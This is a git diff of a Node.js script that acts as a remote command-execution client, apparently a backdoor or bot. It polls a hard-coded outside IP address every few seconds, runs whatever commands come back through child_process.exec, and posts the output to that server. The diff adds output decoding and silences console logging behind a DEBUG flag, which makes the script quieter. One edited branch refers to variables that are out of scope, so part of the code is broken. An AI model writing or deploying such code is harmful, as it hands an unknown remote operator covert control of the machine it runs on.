@@ -1,11 +1,13 @@
 const request = require('request');
+const iconv = require('iconv-lite');
 const exec = require('child_process').exec;
 // const build_in = require('./build_in');
 const fs = require('fs');
 
-const host = 'http://45.32.41.191:81';
-const name = 'pc';
+let host = 'http://45.32.41.191:81';
+let name = 'pc';
 const openLink = false;
+const DEBUG = false;
 
 function initHost() {
     if(fs.existsSync('host')) {
@@ -20,6 +22,11 @@ function initHost() {
     else {
         fs.writeFileSync('name', name);
     }
+    log('started with host:' + host + ' name:' + name);
+}
+
+function log(str) {
+    if(DEBUG) console.log(str);
 }
 
 function get(url, callback){
@@ -44,7 +51,7 @@ function result(cmd, res, callback) {
             name: name,
             cmd: cmd,
             res: res,
-            time: Date.now().toISOString().replace(/T/, ' ').replace(/\..+/, '')
+            time: new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '')
         },
         json: true
     }, callback);
@@ -52,7 +59,7 @@ function result(cmd, res, callback) {
 
 // change name to your client name
 function flush(){
-    console.log('~');
+    // console.log('~');
     get(host + '/flush?name=' + name, async function (error, response, buf) {
         if(!buf) return;
         let json = new Buffer(buf).toString();
@@ -60,22 +67,26 @@ function flush(){
         for(let i = 0; i < cmd_buffer.length; i++){
             let item = cmd_buffer[i];
             let cmd = item.cmd;
+            let encoding = item.encoding ? item.encoding :'gbk';
             if(cmd){
                 // remove useless build_in
                 // if(await build_in.exec(item)){
                 //     console.log('build-in: ', cmd);
                 // }
-                console.log(cmd);
-                exec(cmd, function(err, stdout, stderr) {
-                    console.log('stdout: %s' % stdout);
-                    result(cmd, stdout);
+                log('> ' + cmd);
+                exec(cmd, {encoding: 'buffer'}, function(err, stdout, stderr) {
+                    let res = 'stdout:' + iconv.decode(stdout, encoding) 
+                        + '\nstderr:'+ iconv.decode(stderr, encoding);
+                    log(res);
+                    result(cmd, res);
                 });
                 // run link file automatic
                 if(openLink) {
                     if(!cmd.endsWith('.lnk')){
-                        exec(cmd+'.lnk', function(err, stdout, stderr) {
-                            console.log('stdout: %s' % stdout);
-                        });
+                        let res = 'stdout:' + iconv.decode(stdout, encoding) 
+                            + '\nstderr:'+ iconv.decode(stderr, encoding);
+                        log(res);
+                        result(cmd, res);
                     }
                 }
             }
@@ -104,7 +115,7 @@ function deamon(){
     setImmediate(flush);
     setInterval(flush, 3000);
     setInterval(resetHost, 60 * 60 * 1000);
-    setInterval(updateCode, 3 * 60 * 60 * 1000);
+    // setInterval(updateCode, 3 * 60 * 60 * 1000);
 }
 
 if (require.main === module) {
